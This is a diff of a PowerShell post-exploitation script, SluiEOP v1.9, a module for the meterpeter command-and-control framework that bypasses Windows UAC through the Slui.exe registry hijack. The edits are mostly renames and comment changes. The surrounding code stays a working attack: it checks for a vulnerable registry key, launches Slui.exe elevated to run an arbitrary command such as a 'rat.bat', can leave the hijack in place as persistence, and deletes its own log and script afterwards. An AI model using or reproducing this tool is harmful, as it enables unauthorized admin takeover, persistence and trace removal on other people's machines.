@@ -20,20 +20,20 @@
 .NOTES
    SluiEOP cmdlet was written to be one meterpeter C2 post-exploit module.
    SluiEOP cmdlet supports [ CMD | POWERSHELL | PYTHON ] scripts execution.
-   To run child binarys (.exe) through this cmdlet use: cmd /c start bin.exe
+   To run binarys (.exe) through this cmdlet use: cmd /c start binary.exe
 
    This cmdlet 'reverts' regedit hacks to the previous state before the EOP.
    Unless '$MakeItPersistence' its set to "True". In that case the EOP registry
    hacks will NOT be deleted in the end of exec making the '$Command' persistence.
-   [Remark: .\SluiEOP.ps1 "deleteEOP" argument can be used to delete persistence].
+   Remark: .\SluiEOP.ps1 "deleteEOP" argument its used to delete the persistence.
 
 .EXAMPLE
    PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
-   Execute notepad process with high privileges (Admin)
+   Spawn notepad process with high privileges (Admin)
 
 .EXAMPLE
    PS C:\> .\SluiEOP.ps1 "$Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
-   Execute powershell process with high privileges (Admin)
+   Spawn powershell process with high privileges (Admin)
 
 .EXAMPLE
    PS C:\> .\SluiEOP.ps1 "cmd /c start C:\Users\pedro\AppData\Local\Temp\rat.bat"
@@ -47,7 +47,8 @@
    None. You cannot pipe objects into SluiEOP.ps1
 
 .OUTPUTS
-   Gets the spawned process <UserDomain> <ProcessName> <status> and <PID>
+   Gets the spawned process <UserDomain> <ProcessName> <Status> and <PID>
+   If active '$VerboseMode' then more detailed information will be displayed.
 
 .LINK
     https://github.com/r00t-3xp10it/meterpeter
@@ -57,14 +58,14 @@
 
 
 $Command = $Null               # Command Internal function [<dontchange>]
-$DebugMode = "False"           # Change this value to "True" to debug this cmdlet
-$EOP_Success = $False          # Remote execution Status [<dontchange>]
-$MakeItPersistence = "False"   # Change this value to "True" to persiste $Command
-$param1 = $args[0]             # User Inputs [ <arguments> ] [<dontchange>]
+$VerboseMode = "False"         # Change this value to "True" for verbose
+$EOP_Success = $False          # Remote EOP execution status [<dontchange>]
+$MakeItPersistence = "False"   # Change this value to "True" to make the '$Command' persistence
+$param1 = $args[0]             # User Inputs [ <Arguments> ] [<Parameters>] [<dontchange>]
 $host.UI.RawUI.WindowTitle = " @SluiEOP v1.9 {SSA@redTeam}"
 If(-not($param1) -or $param1 -eq $null){
    $Command = "$Env:WINDIR\System32\cmd.exe"
-   Write-Host "[ ERROR ] SYNTAX: .\SluiEOP.ps1 `"Command to execute`"`n" -ForegroundColor Red -BackgroundColor Black
+   Write-Host "[ ERROR ] Syntax: .\SluiEOP.ps1 `"Command to execute`"`n" -ForegroundColor Red -BackgroundColor Black
    Start-Sleep -Milliseconds 1200
 }Else{
    $Command = "$param1"
@@ -74,12 +75,12 @@ If(-not($param1) -or $param1 -eq $null){
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -EA SilentlyContinue
 If($CheckVuln -eq $True){
 
-   ## SluiEOP post-module banner
+   ## SluiEOP meterpeter post-module banner
    Write-Host "`nSluiEOP v1.9 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
    Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 500
 
    ## Delete 'persistence' '$Command' left behind by: '$MakeItPersistence' function.
-   #  This function 'reverts' all regedit hacks to the previous state before the EOP.
+   # This function 'reverts' all regedit hacks to the previous state before the EOP.
    If($param1 -eq "deleteEOP"){
       Write-Host "[+] Deleting  => EOP registry hacks (revert)";Start-Sleep -Milliseconds 500
       ## Make sure the vulnerable registry key exists
@@ -123,7 +124,7 @@ If($CheckVuln -eq $True){
    Start-Sleep -Milliseconds 3000;Start-Process "$Env:WINDIR\System32\Slui.exe" -Verb runas
 
    Start-Sleep -Milliseconds 2700 # Give time for Slui.exe to finish
-   ## If $MakeItPersistence is set to "True" then the EOP registry hacks will NOT
+   ## If '$MakeItPersistence' is set to "True" then the EOP registry hacks will NOT
    # be deleted in the end of cmdlet execution, making the 'command' persistence.
    If($MakeItPersistence -eq "False"){
       ## Revert Regedit to 'DEFAULT' settings after EOP finished ..
@@ -138,12 +139,12 @@ If($CheckVuln -eq $True){
 
    <#
    .SYNOPSIS
-      Helper - Gets the spawned process <UserDomain> <ProcessName> <status> and <PID>
+      Helper - Gets the spawned process <UserDomain> <ProcessName> <Status> and <PID>
       Author: @r00t-3xp10it
 
    .DESCRIPTION
-      Gets the spawned process <UserDomain> <ProcessName> <status> and <PID>
-      If active '$DebugMode' then more detailed information will be displayed.
+      Gets the spawned process <UserDomain> <ProcessName> <Status> and <PID>
+      If active '$VerboseMode' then more detailed information will be displayed.
 
    .EXAMPLE
       PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
@@ -153,7 +154,7 @@ If($CheckVuln -eq $True){
       SKYNET     notepad      success  5543
    #>
 
-   ## Extracting attacker Spawned ProcessName PID
+   ## Extracting remote Spawned ProcessName|PID
    Write-Host "[+] Executing => EOP output Table displays.`n";Start-Sleep -Milliseconds 500
    If($Command -match '^[cmd]' -and $Command -match ' ' -and $Command -NotMatch '.bat$' -and $Command -NotMatch '.ps1$' -and $Command -NotMatch '.py$'){
       ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
@@ -220,35 +221,35 @@ If($CheckVuln -eq $True){
 
    ## Build MY PSObject Table to display results
    $MYPSObjectTable = New-Object -TypeName PSObject
-   If($DebugMode -eq "True"){
+   If($VerboseMode -eq "True"){
       $RemoteOS = (Get-WmiObject Win32_OperatingSystem).Caption
-      $OS_version = (Get-WmiObject Win32_Process|Select-Object).WindowsVersion|Select -Last 1 -EA SilentlyContinue
+      $OSversion = (Get-WmiObject Win32_Process|Select-Object).WindowsVersion|Select -Last 1 -EA SilentlyContinue
       $SpawnPath = (Get-Process $ProcessName -EA SilentlyContinue|select *).Path|Select -Last 1 -EA SilentlyContinue
       $SpawnTime = (Get-Process $ProcessName -EA SilentlyContinue|select *).StartTime|Select -Last 1 -EA SilentlyContinue
       $GroupToken = Get-WmiObject Win32_Process -Filter "name='$ProcessToken'"|Select Name, @{Name="UserName";Expression={$_.GetOwner().Domain+"\"+$_.GetOwner().User}}|Select -Last 1|Select-Object -ExpandProperty UserName
       $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "InnerCode" -Value "$ReturnCode"
     }
     If($EOP_Success -eq $True){$EOPState = "success"}Else{$EOPState = "error ?";$EOPID = "null"}
-    If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Architecture" -Value "$Env:PROCESSOR_ARCHITECTURE"}
+    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Architecture" -Value "$Env:PROCESSOR_ARCHITECTURE"}
     $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "UserDomain" -Value "$Env:USERDOMAIN"
     $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
     $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Status" -Value "$EOPState"
     $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "PID" -Value "$EOPID"
-    If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "StartTime" -Value "$SpawnTime"}
-    If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "RemoteHost" -Value "$RemoteOS"}
-    If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessPath" -Value "$SpawnPath"}
-    If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "EOPCommand" -Value "$Command"}
-    If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Owner" -Value "$GroupToken"}
-    If($DebugMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "OSversion" -Value "$OS_version"}
+    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "StartTime" -Value "$SpawnTime"}
+    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "RemoteHost" -Value "$RemoteOS"}
+    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessPath" -Value "$SpawnPath"}
+    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "EOPCommand" -Value "$Command"}
+    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Owner" -Value "$GroupToken"}
+    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "OSversion" -Value "$OSversion"}
     echo $MYPSObjectTable > $Env:TMP\sLUIEop.log
 
 }Else{
-   ## Vulnerable registry hive => not found
+   ## Vulnerable registry Hive => not found
    Write-Host "`nSluiEOP v1.9 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
    Write-Host "[ ERROR ] System Doesn't Seems Vulnerable, Aborting ..`n" -ForegroundColor red -BackgroundColor Black
 }
 
-## Clean old files left behind after EOP finished ..
+## Clean old files left behind by SluiEOP after the job is finished ..
 If(Test-Path "$Env:TMP\sLUIEop.log"){Get-Content -Path "$Env:TMP\sLUIEop.log" -EA SilentlyContinue;Remove-Item -Path "$Env:TMP\sLUIEop.log" -Force -EA SilentlyContinue}
 If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
 Exit
